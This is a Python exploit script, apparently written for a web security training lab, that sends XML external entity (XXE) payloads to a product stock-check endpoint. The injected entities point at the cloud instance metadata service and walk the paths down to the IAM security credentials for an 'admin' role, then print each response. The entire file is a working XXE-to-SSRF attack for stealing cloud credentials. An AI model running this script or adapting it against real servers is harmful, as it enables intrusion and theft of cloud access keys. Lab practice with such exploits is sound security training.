import requests

# Target URL of the vulnerable endpoint (replace with the actual URL)
target_url = "https://0a42009d04fcad20802cc60e00e800e0.web-security-academy.net/product/stock"  # Modify this with the real vulnerable URL

# Iterate over possible metadata paths to explore
paths = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
]

# Send requests for each path
for path in paths:
    xxe_payload = f"""
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "{path}">
    ]>
    <stockCheck>
      <productId>&xxe;</productId>
      <storeId>1</storeId>
    </stockCheck>
    """

    headers = {
        'Content-Type': 'application/xml',
    }

    try:
        response = requests.post(target_url, data=xxe_payload, headers=headers)
        if response.status_code == 200:
            print(f"Response from {path}:")
            print(response.text)
        else:
            print(f"Failed for {path} - Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error for {path}: {e}")
